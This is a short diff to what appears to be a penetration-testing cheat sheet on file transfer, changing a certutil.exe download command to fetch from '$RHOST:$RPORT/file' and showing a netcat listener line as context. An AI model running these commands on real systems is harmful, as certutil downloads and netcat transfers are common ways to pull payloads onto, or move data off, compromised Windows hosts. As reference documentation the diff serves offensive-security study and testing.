@@ -188,7 +188,7 @@ nc -lp 8888 > outfile
 
 ### Certutil
 ```
-certutil.exe -urlcache -split -f "$RHOST" outfile.zip
+certutil.exe -urlcache -split -f "$RHOST:$RPORT/file" outfile.zip
 ```
 
 ### curl
